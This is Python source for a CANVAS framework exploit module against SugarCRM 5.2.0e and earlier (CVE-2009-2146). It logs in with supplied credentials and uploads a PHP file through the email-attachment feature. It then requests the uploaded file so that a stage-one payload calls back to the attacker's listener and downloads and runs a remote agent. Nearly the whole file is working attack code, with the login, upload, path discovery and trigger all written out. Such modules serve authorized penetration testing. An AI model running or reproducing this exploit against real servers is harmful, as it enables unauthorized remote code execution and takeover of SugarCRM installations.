#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit
import libs.spkproxy as spkproxy #for urlopen
import re

NAME="sugarcrm_fileupload"
DESCRIPTION="SugarCRM <= 5.2.0e Remote Code Execution"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="http://www.sugarcrm.com"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["References"]=["http://www.ush.it/team/ush/hack-sugarcrm_520e/adv.txt"]
DOCUMENTATION["CVE Name"] = "CVE-2009-2146"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2146"
DOCUMENTATION["Notes"] = "Tested on SugarCRM 5.2.0c.  This exploits needs a valid username and password for SugarCRM to exploit as the vulnerability lies in the compose email feature."

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

import urllib, time
from phplistener import get_php_stage1 #get our "Shellcode" 

NOTES="""

"""

CHANGELOG="""
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port               = 80
        self.host               = ""
        self.badstring          = "\x00"
        self.setVersions()
        self.version            = 0
        self.done               = 0
        self.name               = NAME    
        self.basepath           = "/"
        self.username           = ""
        self.password           = ""
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.composemailpage    = "/index.php?module=Emails&action=Compose"
        self.loginpage          = "/index.php?action=Login&module=Users"
        self.pathtoourfile      = "/cache/modules/Emails/"
        self.timezonepage       = "/index.php?module=Users&action=SaveTimezone&SaveTimezone=True"
        self.hostname           = ""
        return

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host     = self.target.interface
        self.hostname = self.argsDict.get("hostname", self.hostname)
        self.port     = int(self.argsDict.get("port",self.port))
        self.basepath = self.argsDict.get("basepath", self.basepath)
        self.ssl      = self.argsDict.get("ssl",self.ssl)
        self.username = self.argsDict.get("username", self.username)
        self.password = self.argsDict.get("password", self.password)
        #self.getarg("basicauth_user")
        #self.getarg("basicauth_password")
        """
        if self.hostname in [None, ""]:
            allhosts=self.target.get_knowledge("www_hostnames")
            if allhosts==None:
                allhosts=["%s"%self.host]
        else:
            allhosts=[self.hostname]
        self.allhosts=allhosts
        """
        self.allhosts=[self.hostname]
        return 
    
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        self.versions[1]=[""]

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.PHPMULTI]
        
    def test(self):
        """
        Quicky banner check - looks for comon basepaths
        """    
        self.getargs()
        self.log("Using basepath=%s"%self.basepath)
        self.log("Using vhost=%s"%self.hostname)
        if self.ssl:
            protocol="https"
        else:
            protocol="http"

        for hostname in self.allhosts:
            self.log("Testing hostname: %s"%hostname)

            #automatically check out some common basepaths, starting with the one specified
            for basepath in [self.basepath, "/sugarcrm/"]:
                self.log("Testing for basepath: %s"%basepath)

                #If we have to do basic-auth, let's get an object from spkproxy here
                if self.basicauth_user !="":
                    auth=spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
                else:
                    auth=None 
                    
                fd=spkproxy.urlopen(protocol+"://"+self.host+":%s"%self.port+"/"+basepath, hostname=hostname, exploit=self, auth=auth)
                data=fd.read()

                #now that we have the web page - we parse it and look for vulnerable versions
                #list of vulnerable versions so far
                for s in ["ver=5.2.0c", "ver=5.2.0e","ver=5.2.0"]:
                    #self.log("Data=%s"%data) #print out web page (big)
                    if s in data:
                        self.log("Found SugarCRM in vhost %s at basepath %s"%(hostname, basepath))
                        self.argsDict["basepath"]=basepath
                        self.basepath=basepath
                        self.hostname=hostname
                        self.version=1
                        return 1
        return 0

    def getfile(self):
        phpfile="""-----------------------------3922242971797626524322043819
Content-Disposition: form-data; name="to_pdf"

true
-----------------------------3922242971797626524322043819
Content-Disposition: form-data; name="module"

Emails
-----------------------------3922242971797626524322043819
Content-Disposition: form-data; name="action"

EmailUIAjax
-----------------------------3922242971797626524322043819
Content-Disposition: form-data; name="emailUIAction"

uploadAttachment
-----------------------------3922242971797626524322043819
Content-Disposition: form-data; name="email_attachment"; filename=".php"
Content-Type: application/octet-stream

<?php

%s

?>


-----------------------------3922242971797626524322043819--

"""%self.get_php_to_mosdef()

        return phpfile
    
    
    def run(self):
        self.getargs()
        test = self.test()
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.hostname,self.port))
        
        self.log("Attacking %s:%d"%(self.hostname,self.port))
        #self.log("Basic Auth User: %s"%self.basicauth_user)
        self.log("VHost: %s"%self.hostname)
        if self.ssl:
            protocol="https"
        else:
            protocol="http"

        #If we have to do basic-auth, let's get an object from spkproxy here
        if self.basicauth_user !="":
            auth=spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
        else:
            auth=None
        
        useragentstring=protocol+"://"+self.host+":%s"%self.port+"/"+self.basepath    
        self.log("useragentstring: %s"%useragentstring)

        UA=spkproxy.UserAgent(useragentstring, auth=auth, hostname=self.hostname, exploit=self)
        
        response=UA.POST(self.loginpage,"module=Users&action=Authenticate&return_module=Users&return_action=Login&cant_login=&login_module=&login_action=&login_record=&user_name=%s&user_password=%s&login_theme=Sugar&login_language=en_us&Login=++Login++"%(self.username,self.password), noresponse=False)                 
        #self.log("AFTER LOGIN %s"%response)
        
        #if the user has not assigned a valid timezone in which they reside then we can't continue to get a userid
        #if "action=SetTimezone" in response:
        #self.log("setting time zone for %s"%self.username)
        response = UA.POST(self.timezonepage, "record=&module=Users&action=SaveTimezone&SaveTimezone=true&timezone=America%2FNew_York&button=++Save++")
        #self.log(response)
            
        #find out what are assigned userid is
        #<a href="index.php?module=Emails&action=ListView&assigned_user_id=abf7c77b-2f71-8071-63ba-4a131068e9a2&type=archived">
        #not very pretty - but it works!
        response=UA.GET(self.composemailpage)
        #self.log(response)
        
        try:
            userid=response.split("assigned_user_id=")[1].split("&")[0]
            self.log("Assigned User-Id: %s"%userid)
        except:
            self.log("Couldn't determine our assigned_user_id - make sure we are connecting to the correct SugarCRM host!")
            return 0
        
        #push our file up
        UA.addHeader("Content-Type","multipart/form-data; boundary=---------------------------3922242971797626524322043819")
        response = UA.POST(self.composemailpage, self.getfile())
        #self.log(response)
        #{"guid":"c7e4746b-bba6-6dfd-7a2b-4a3977a03f0d","name":".php","nameForDisplay":".php"}
        
        try:
            prefix=response.split(",")[0].split(":")[1].strip("\"")
            ourphpfilename=prefix+".php"
            self.log("our remote filename: %s"%ourphpfilename)
        except:
            self.log("Couldn't determine our remote filename - make sure we are connecting to the correct SugarCRM host!")
            return 0
        
        ourfile=self.pathtoourfile+"//"+userid+"//"+ourphpfilename
        self.log("Path to our file: %s"%ourfile)
        #execute our file!
        UA.clearHeaders()
        response=UA.GET(ourfile, noresponse=True)
        
        for i in xrange(0,3): #wait three seconds for callback
                time.sleep(1)
                ret=self.ISucceeded()
                if ret:
                    break
        
        if ret:
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
        return ret
        
    def get_php_to_mosdef(self):
        """
        Creates a string which when included in php's eval() will download and execute
        MOSDEF
        """
        
        localhost=self.callback.ip
        localport=self.callback.port
        self.log("Using PHPMULTI callback of %s:%d"%(localhost,localport))

        badchars="" #none for this one
        ret=get_php_stage1(badchars,localhost,localport)
            
        return ret
        
    def shutdown(self):
        self.done=1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
